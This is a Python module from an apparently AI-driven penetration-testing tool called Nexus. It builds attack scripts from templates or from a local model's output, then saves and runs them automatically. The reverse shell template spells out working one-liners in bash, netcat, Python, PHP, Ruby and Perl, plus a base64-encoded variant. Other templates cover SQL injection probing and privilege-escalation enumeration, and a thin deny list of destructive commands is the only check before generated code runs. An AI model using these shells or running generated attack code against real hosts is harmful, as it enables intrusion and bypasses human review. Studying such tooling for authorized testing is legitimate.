"""
Nexus Custom Script Generator

AI-powered custom script generation and execution system that creates
tailored penetration testing scripts based on target characteristics,
discovered vulnerabilities, and campaign objectives.
"""

import os
import tempfile
import subprocess
import hashlib
import json
import time
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from enum import Enum
from pathlib import Path
import logging

logger = logging.getLogger(__name__)


class ScriptLanguage(Enum):
    """Supported script languages"""
    BASH = "bash"
    PYTHON = "python"
    POWERSHELL = "powershell"
    PERL = "perl"
    RUBY = "ruby"
    JAVASCRIPT = "javascript"


class ScriptPurpose(Enum):
    """Script purposes for categorization"""
    RECONNAISSANCE = "reconnaissance"
    ENUMERATION = "enumeration"
    EXPLOITATION = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    PERSISTENCE = "persistence"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    LATERAL_MOVEMENT = "lateral_movement"
    DATA_EXFILTRATION = "data_exfiltration"
    CLEANUP = "cleanup"


@dataclass
class ScriptTemplate:
    """Template for script generation"""
    name: str
    language: ScriptLanguage
    purpose: ScriptPurpose
    description: str
    template: str
    variables: List[str]
    requirements: List[str]
    safety_level: str  # LOW, MEDIUM, HIGH, CRITICAL


@dataclass
class GeneratedScript:
    """Generated script with metadata"""
    script_id: str
    name: str
    language: ScriptLanguage
    purpose: ScriptPurpose
    content: str
    file_path: str
    variables: Dict[str, Any]
    created_at: float
    executed: bool = False
    execution_results: Optional[Dict[str, Any]] = None


class CustomScriptGenerator:
    """AI-powered custom script generator"""
    
    def __init__(self, ai_client, config):
        self.ai_client = ai_client
        self.config = config
        self.script_templates = {}
        self.generated_scripts = {}
        self.script_directory = os.path.expanduser("~/.nexus/scripts")
        self.load_templates()
        self.ensure_script_directory()
    
    def ensure_script_directory(self):
        """Ensure script directory exists"""
        os.makedirs(self.script_directory, exist_ok=True)
        os.makedirs(os.path.join(self.script_directory, "generated"), exist_ok=True)
        os.makedirs(os.path.join(self.script_directory, "templates"), exist_ok=True)
    
    def load_templates(self):
        """Load script templates"""
        self.script_templates = {
            # Reconnaissance Scripts
            "port_scanner": ScriptTemplate(
                name="Custom Port Scanner",
                language=ScriptLanguage.PYTHON,
                purpose=ScriptPurpose.RECONNAISSANCE,
                description="Custom port scanner with specific parameters",
                template="""#!/usr/bin/env python3
import socket
import threading
import sys
from datetime import datetime

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout({{timeout}})
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port}: Open")
            try:
                banner = sock.recv(1024).decode().strip()
                if banner:
                    print(f"  Banner: {banner}")
            except:
                pass
        sock.close()
    except Exception as e:
        pass

def main():
    target = "{{target}}"
    ports = {{ports}}
    threads = {{threads}}
    
    print(f"Scanning {target} for ports: {ports}")
    print(f"Started at: {datetime.now()}")
    
    for port in ports:
        thread = threading.Thread(target=scan_port, args=(target, port))
        thread.daemon = True
        thread.start()
        
        # Limit concurrent threads
        if threading.active_count() > threads:
            time.sleep(0.1)
    
    # Wait for all threads to complete
    while threading.active_count() > 1:
        time.sleep(0.1)
    
    print(f"Completed at: {datetime.now()}")

if __name__ == "__main__":
    main()
""",
                variables=["target", "ports", "timeout", "threads"],
                requirements=["python3"],
                safety_level="LOW"
            ),
            
            "web_directory_fuzzer": ScriptTemplate(
                name="Custom Web Directory Fuzzer",
                language=ScriptLanguage.PYTHON,
                purpose=ScriptPurpose.ENUMERATION,
                description="Custom web directory fuzzing with specific wordlist",
                template="""#!/usr/bin/env python3
import requests
import threading
import sys
from urllib.parse import urljoin
import time

def fuzz_directory(base_url, directory, user_agent):
    try:
        url = urljoin(base_url, directory)
        headers = {'User-Agent': user_agent}
        response = requests.get(url, headers=headers, timeout={{timeout}}, allow_redirects=False)
        
        if response.status_code in [200, 301, 302, 403]:
            print(f"[{response.status_code}] {url}")
            if response.status_code == 200:
                print(f"  Size: {len(response.content)} bytes")
    except requests.exceptions.RequestException:
        pass

def main():
    base_url = "{{base_url}}"
    wordlist = {{wordlist}}
    threads = {{threads}}
    user_agent = "{{user_agent}}"
    
    print(f"Fuzzing directories on: {base_url}")
    print(f"Wordlist entries: {len(wordlist)}")
    print(f"Threads: {threads}")
    
    for directory in wordlist:
        thread = threading.Thread(target=fuzz_directory, args=(base_url, directory, user_agent))
        thread.daemon = True
        thread.start()
        
        # Rate limiting
        if threading.active_count() > threads:
            time.sleep({{delay}})
    
    # Wait for completion
    while threading.active_count() > 1:
        time.sleep(0.1)

if __name__ == "__main__":
    main()
""",
                variables=["base_url", "wordlist", "threads", "timeout", "delay", "user_agent"],
                requirements=["python3", "requests"],
                safety_level="LOW"
            ),
            
            "sql_injection_tester": ScriptTemplate(
                name="Custom SQL Injection Tester",
                language=ScriptLanguage.PYTHON,
                purpose=ScriptPurpose.EXPLOITATION,
                description="Custom SQL injection testing script",
                template="""#!/usr/bin/env python3
import requests
import urllib.parse
import time
import sys

def test_sql_injection(url, parameter, payload):
    try:
        # URL encode the payload
        encoded_payload = urllib.parse.quote(payload)
        
        # Construct test URL
        if '?' in url:
            test_url = f"{url}&{parameter}={encoded_payload}"
        else:
            test_url = f"{url}?{parameter}={encoded_payload}"
        
        headers = {'User-Agent': '{{user_agent}}'}
        response = requests.get(test_url, headers=headers, timeout={{timeout}})
        
        # Check for SQL error indicators
        error_indicators = [
            'sql syntax', 'mysql_fetch', 'ora-', 'microsoft ole db',
            'odbc', 'sqlite', 'postgresql', 'warning: mysql'
        ]
        
        response_lower = response.text.lower()
        for indicator in error_indicators:
            if indicator in response_lower:
                print(f"[POTENTIAL SQLi] {test_url}")
                print(f"  Error indicator: {indicator}")
                print(f"  Response length: {len(response.text)}")
                return True
        
        return False
        
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False

def main():
    url = "{{target_url}}"
    parameters = {{parameters}}
    payloads = {{payloads}}
    
    print(f"Testing SQL injection on: {url}")
    print(f"Parameters: {parameters}")
    print(f"Payloads: {len(payloads)}")
    
    for param in parameters:
        print(f"\\nTesting parameter: {param}")
        for payload in payloads:
            if test_sql_injection(url, param, payload):
                print(f"  Vulnerable to: {payload}")
            time.sleep({{delay}})

if __name__ == "__main__":
    main()
""",
                variables=["target_url", "parameters", "payloads", "timeout", "delay", "user_agent"],
                requirements=["python3", "requests"],
                safety_level="MEDIUM"
            ),
            
            "reverse_shell_generator": ScriptTemplate(
                name="Reverse Shell Generator",
                language=ScriptLanguage.BASH,
                purpose=ScriptPurpose.EXPLOITATION,
                description="Generate various reverse shell payloads",
                template="""#!/bin/bash

# Reverse Shell Generator
# Target: {{target_ip}}
# Port: {{target_port}}

echo "=== Reverse Shell Payloads ==="
echo "Target: {{target_ip}}:{{target_port}}"
echo ""

echo "=== Bash Reverse Shell ==="
echo "bash -i >& /dev/tcp/{{target_ip}}/{{target_port}} 0>&1"
echo ""

echo "=== Netcat Reverse Shell ==="
echo "nc -e /bin/sh {{target_ip}} {{target_port}}"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {{target_ip}} {{target_port}} >/tmp/f"
echo ""

echo "=== Python Reverse Shell ==="
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{target_ip}}\",{{target_port}}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo ""

echo "=== PHP Reverse Shell ==="
echo "php -r '\$sock=fsockopen(\"{{target_ip}}\",{{target_port}});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""

echo "=== Ruby Reverse Shell ==="
echo "ruby -rsocket -e'f=TCPSocket.open(\"{{target_ip}}\",{{target_port}}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo ""

echo "=== Perl Reverse Shell ==="
echo "perl -e 'use Socket;\$i=\"{{target_ip}}\";\$p={{target_port}};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo ""

# Generate listener command
echo "=== Listener Command ==="
echo "nc -lvnp {{target_port}}"
echo ""

# Generate encoded versions
echo "=== Base64 Encoded Bash Shell ==="
BASH_SHELL="bash -i >& /dev/tcp/{{target_ip}}/{{target_port}} 0>&1"
ENCODED_SHELL=$(echo -n "$BASH_SHELL" | base64 -w 0)
echo "echo $ENCODED_SHELL | base64 -d | bash"
echo ""
""",
                variables=["target_ip", "target_port"],
                requirements=["bash", "base64"],
                safety_level="HIGH"
            ),
            
            "privilege_escalation_checker": ScriptTemplate(
                name="Linux Privilege Escalation Checker",
                language=ScriptLanguage.BASH,
                purpose=ScriptPurpose.PRIVILEGE_ESCALATION,
                description="Check for common privilege escalation vectors",
                template="""#!/bin/bash

echo "=== Linux Privilege Escalation Checker ==="
echo "Started at: $(date)"
echo ""

# Check current user and groups
echo "=== Current User Information ==="
echo "User: $(whoami)"
echo "UID: $(id -u)"
echo "Groups: $(groups)"
echo "Full ID: $(id)"
echo ""

# Check sudo permissions
echo "=== Sudo Permissions ==="
sudo -l 2>/dev/null || echo "Cannot check sudo permissions"
echo ""

# Check for SUID binaries
echo "=== SUID Binaries ==="
find / -perm -4000 -type f 2>/dev/null | head -20
echo ""

# Check for writable directories
echo "=== World Writable Directories ==="
find / -type d -perm -002 2>/dev/null | grep -v proc | head -10
echo ""

# Check for interesting files
echo "=== Interesting Files ==="
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | grep -E "(apache|nginx|mysql|ssh)" | head -10
echo ""

# Check running processes
echo "=== Running Processes ==="
ps aux | grep -v "\\[" | head -10
echo ""

# Check network connections
echo "=== Network Connections ==="
netstat -tulpn 2>/dev/null | head -10
echo ""

# Check cron jobs
echo "=== Cron Jobs ==="
crontab -l 2>/dev/null || echo "No user crontab"
ls -la /etc/cron* 2>/dev/null
echo ""

# Check environment variables
echo "=== Environment Variables ==="
env | grep -E "(PATH|HOME|USER|SHELL)" | head -10
echo ""

# Check kernel version
echo "=== System Information ==="
uname -a
cat /etc/os-release 2>/dev/null | head -5
echo ""

echo "Completed at: $(date)"
""",
                variables=[],
                requirements=["bash"],
                safety_level="MEDIUM"
            ),
            
            "windows_enum_script": ScriptTemplate(
                name="Windows Enumeration Script",
                language=ScriptLanguage.POWERSHELL,
                purpose=ScriptPurpose.ENUMERATION,
                description="Windows system enumeration script",
                template="""# Windows Enumeration Script
# Generated by Nexus

Write-Host "=== Windows System Enumeration ===" -ForegroundColor Green
Write-Host "Started at: $(Get-Date)" -ForegroundColor Yellow
Write-Host ""

# System Information
Write-Host "=== System Information ===" -ForegroundColor Cyan
Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory
Get-WmiObject -Class Win32_OperatingSystem | Select-Object Caption, Version, Architecture
Write-Host ""

# Current User Information
Write-Host "=== Current User Information ===" -ForegroundColor Cyan
whoami
whoami /priv
whoami /groups
Write-Host ""

# Network Information
Write-Host "=== Network Information ===" -ForegroundColor Cyan
ipconfig /all
Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object Name, InterfaceDescription, LinkSpeed
Write-Host ""

# Running Processes
Write-Host "=== Running Processes ===" -ForegroundColor Cyan
Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, Id, CPU, WorkingSet
Write-Host ""

# Services
Write-Host "=== Interesting Services ===" -ForegroundColor Cyan
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object -First 15 Name, Status, StartType
Write-Host ""

# Installed Software
Write-Host "=== Installed Software ===" -ForegroundColor Cyan
Get-WmiObject -Class Win32_Product | Select-Object -First 10 Name, Version, Vendor
Write-Host ""

# Scheduled Tasks
Write-Host "=== Scheduled Tasks ===" -ForegroundColor Cyan
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} | Select-Object -First 10 TaskName, State, Author
Write-Host ""

# Local Users and Groups
Write-Host "=== Local Users ===" -ForegroundColor Cyan
Get-LocalUser | Select-Object Name, Enabled, LastLogon
Write-Host ""

Write-Host "=== Local Groups ===" -ForegroundColor Cyan
Get-LocalGroup | Select-Object Name, Description
Write-Host ""

# File System Information
Write-Host "=== Drive Information ===" -ForegroundColor Cyan
Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, FileSystem, Size, FreeSpace
Write-Host ""

# Registry Information
Write-Host "=== Registry Information ===" -ForegroundColor Cyan
Write-Host "Checking for interesting registry keys..."
$regKeys = @(
    "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
)

foreach ($key in $regKeys) {
    if (Test-Path $key) {
        Write-Host "Registry Key: $key" -ForegroundColor Yellow
        Get-ItemProperty -Path $key | Format-List
    }
}

Write-Host ""
Write-Host "Completed at: $(Get-Date)" -ForegroundColor Green
""",
                variables=[],
                requirements=["powershell"],
                safety_level="LOW"
            )
        }
    
    async def generate_custom_script(self, purpose: ScriptPurpose, target_info: Dict[str, Any], 
                                   context: Dict[str, Any]) -> GeneratedScript:
        """Generate a custom script using AI"""
        
        # Build AI prompt for script generation
        prompt = self._build_script_generation_prompt(purpose, target_info, context)
        
        # Get AI response
        from nexus.ai.ollama_client import GenerationRequest
        request = GenerationRequest(
            model=self.config.ai.model,
            prompt=prompt,
            system="You are an expert penetration tester and script developer. Generate secure, effective, and well-commented scripts for authorized penetration testing.",
            temperature=0.3,  # Lower temperature for more consistent code generation
            max_tokens=4096
        )
        
        response = await self.ai_client.generate(request)
        
        # Parse the response to extract script content
        script_content = self._parse_ai_script_response(response.response)
        
        # Generate script metadata
        script_id = self._generate_script_id(script_content)
        script_name = f"{purpose.value}_{int(time.time())}"
        
        # Determine script language based on content
        language = self._detect_script_language(script_content)
        
        # Create script file
        script_path = self._create_script_file(script_id, script_name, language, script_content)
        
        # Create GeneratedScript object
        generated_script = GeneratedScript(
            script_id=script_id,
            name=script_name,
            language=language,
            purpose=purpose,
            content=script_content,
            file_path=script_path,
            variables=context,
            created_at=time.time()
        )
        
        # Store the generated script
        self.generated_scripts[script_id] = generated_script
        
        logger.info(f"Generated custom script: {script_name} ({script_id})")
        return generated_script
    
    def generate_from_template(self, template_name: str, variables: Dict[str, Any]) -> GeneratedScript:
        """Generate script from template"""
        
        if template_name not in self.script_templates:
            raise ValueError(f"Template '{template_name}' not found")
        
        template = self.script_templates[template_name]
        
        # Validate required variables
        missing_vars = [var for var in template.variables if var not in variables]
        if missing_vars:
            raise ValueError(f"Missing required variables: {missing_vars}")
        
        # Replace variables in template
        script_content = template.template
        for var, value in variables.items():
            placeholder = f"{{{{{var}}}}}"
            if isinstance(value, list):
                value = str(value)
            script_content = script_content.replace(placeholder, str(value))
        
        # Generate script metadata
        script_id = self._generate_script_id(script_content)
        script_name = f"{template.name.lower().replace(' ', '_')}_{int(time.time())}"
        
        # Create script file
        script_path = self._create_script_file(script_id, script_name, template.language, script_content)
        
        # Create GeneratedScript object
        generated_script = GeneratedScript(
            script_id=script_id,
            name=script_name,
            language=template.language,
            purpose=template.purpose,
            content=script_content,
            file_path=script_path,
            variables=variables,
            created_at=time.time()
        )
        
        # Store the generated script
        self.generated_scripts[script_id] = generated_script
        
        logger.info(f"Generated script from template '{template_name}': {script_name}")
        return generated_script
    
    async def execute_script(self, script_id: str, execution_context: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute a generated script"""
        
        if script_id not in self.generated_scripts:
            raise ValueError(f"Script '{script_id}' not found")
        
        script = self.generated_scripts[script_id]
        
        # Safety check
        if not self._is_script_safe_to_execute(script):
            raise ValueError(f"Script '{script_id}' failed safety checks")
        
        # Prepare execution environment
        execution_env = os.environ.copy()
        if execution_context:
            execution_env.update({k: str(v) for k, v in execution_context.items()})
        
        # Determine execution command
        exec_command = self._get_execution_command(script)
        
        try:
            # Execute the script
            start_time = time.time()
            result = subprocess.run(
                exec_command,
                capture_output=True,
                text=True,
                timeout=self.config.tools.get(script.language.value, {}).get('timeout', 300),
                env=execution_env,
                cwd=os.path.dirname(script.file_path)
            )
            
            execution_time = time.time() - start_time
            
            # Prepare execution results
            execution_results = {
                'return_code': result.returncode,
                'stdout': result.stdout,
                'stderr': result.stderr,
                'execution_time': execution_time,
                'executed_at': time.time(),
                'success': result.returncode == 0
            }
            
            # Update script record
            script.executed = True
            script.execution_results = execution_results
            
            logger.info(f"Executed script '{script.name}' with return code {result.returncode}")
            return execution_results
            
        except subprocess.TimeoutExpired:
            execution_results = {
                'return_code': -1,
                'stdout': '',
                'stderr': 'Script execution timed out',
                'execution_time': self.config.tools.get(script.language.value, {}).get('timeout', 300),
                'executed_at': time.time(),
                'success': False
            }
            
            script.executed = True
            script.execution_results = execution_results
            
            logger.error(f"Script '{script.name}' execution timed out")
            return execution_results
            
        except Exception as e:
            execution_results = {
                'return_code': -1,
                'stdout': '',
                'stderr': str(e),
                'execution_time': 0,
                'executed_at': time.time(),
                'success': False
            }
            
            script.executed = True
            script.execution_results = execution_results
            
            logger.error(f"Script '{script.name}' execution failed: {e}")
            return execution_results
    
    def list_generated_scripts(self) -> List[GeneratedScript]:
        """List all generated scripts"""
        return list(self.generated_scripts.values())
    
    def get_script(self, script_id: str) -> Optional[GeneratedScript]:
        """Get a specific generated script"""
        return self.generated_scripts.get(script_id)
    
    def delete_script(self, script_id: str) -> bool:
        """Delete a generated script"""
        if script_id not in self.generated_scripts:
            return False
        
        script = self.generated_scripts[script_id]
        
        # Remove script file
        try:
            if os.path.exists(script.file_path):
                os.remove(script.file_path)
        except Exception as e:
            logger.error(f"Failed to remove script file: {e}")
        
        # Remove from memory
        del self.generated_scripts[script_id]
        
        logger.info(f"Deleted script '{script.name}' ({script_id})")
        return True
    
    def _build_script_generation_prompt(self, purpose: ScriptPurpose, target_info: Dict[str, Any], 
                                      context: Dict[str, Any]) -> str:
        """Build AI prompt for script generation"""
        
        prompt = f"""Generate a custom {purpose.value} script based on the following information:

TARGET INFORMATION:
{json.dumps(target_info, indent=2)}

CONTEXT:
{json.dumps(context, indent=2)}

REQUIREMENTS:
1. Generate a complete, executable script
2. Include proper error handling
3. Add informative comments
4. Make the script modular and reusable
5. Include safety checks where appropriate
6. Output results in a structured format

SCRIPT PURPOSE: {purpose.value}

Please generate the script with the following format:
- Start with a shebang line (#!/bin/bash, #!/usr/bin/env python3, etc.)
- Include a header comment describing the script's purpose
- Use appropriate language constructs for the task
- Include proper error handling
- End with a main execution block

Generate only the script code, no additional explanation."""

        return prompt
    
    def _parse_ai_script_response(self, response: str) -> str:
        """Parse AI response to extract script content"""
        # Remove any markdown code blocks
        if "```" in response:
            lines = response.split('\n')
            in_code_block = False
            script_lines = []
            
            for line in lines:
                if line.strip().startswith("```"):
                    in_code_block = not in_code_block
                    continue
                
                if in_code_block:
                    script_lines.append(line)
            
            return '\n'.join(script_lines)
        
        return response.strip()
    
    def _detect_script_language(self, script_content: str) -> ScriptLanguage:
        """Detect script language from content"""
        first_line = script_content.split('\n')[0].lower()
        
        if 'python' in first_line:
            return ScriptLanguage.PYTHON
        elif 'bash' in first_line or 'sh' in first_line:
            return ScriptLanguage.BASH
        elif 'powershell' in first_line or 'pwsh' in first_line:
            return ScriptLanguage.POWERSHELL
        elif 'perl' in first_line:
            return ScriptLanguage.PERL
        elif 'ruby' in first_line:
            return ScriptLanguage.RUBY
        elif 'node' in first_line:
            return ScriptLanguage.JAVASCRIPT
        else:
            # Default to bash for shell scripts
            return ScriptLanguage.BASH
    
    def _generate_script_id(self, script_content: str) -> str:
        """Generate unique script ID"""
        content_hash = hashlib.sha256(script_content.encode()).hexdigest()
        return f"script_{content_hash[:12]}"
    
    def _create_script_file(self, script_id: str, script_name: str, language: ScriptLanguage, 
                          content: str) -> str:
        """Create script file on disk"""
        
        # Determine file extension
        extensions = {
            ScriptLanguage.BASH: '.sh',
            ScriptLanguage.PYTHON: '.py',
            ScriptLanguage.POWERSHELL: '.ps1',
            ScriptLanguage.PERL: '.pl',
            ScriptLanguage.RUBY: '.rb',
            ScriptLanguage.JAVASCRIPT: '.js'
        }
        
        extension = extensions.get(language, '.sh')
        filename = f"{script_name}_{script_id}{extension}"
        script_path = os.path.join(self.script_directory, "generated", filename)
        
        # Write script to file
        with open(script_path, 'w') as f:
            f.write(content)
        
        # Make script executable
        os.chmod(script_path, 0o755)
        
        return script_path
    
    def _is_script_safe_to_execute(self, script: GeneratedScript) -> bool:
        """Check if script is safe to execute"""
        
        # Check for dangerous commands
        dangerous_patterns = [
            'rm -rf /',
            'format ',
            'del /s /q',
            'shutdown',
            'reboot',
            'halt',
            'poweroff',
            'mkfs',
            'dd if=/dev/zero'
        ]
        
        content_lower = script.content.lower()
        for pattern in dangerous_patterns:
            if pattern in content_lower:
                logger.warning(f"Script '{script.name}' contains dangerous pattern: {pattern}")
                return False
        
        return True
    
    def _get_execution_command(self, script: GeneratedScript) -> List[str]:
        """Get command to execute script"""
        
        commands = {
            ScriptLanguage.BASH: ['bash', script.file_path],
            ScriptLanguage.PYTHON: ['python3', script.file_path],
            ScriptLanguage.POWERSHELL: ['pwsh', '-File', script.file_path],
            ScriptLanguage.PERL: ['perl', script.file_path],
            ScriptLanguage.RUBY: ['ruby', script.file_path],
            ScriptLanguage.JAVASCRIPT: ['node', script.file_path]
        }
        
        return commands.get(script.language, ['bash', script.file_path])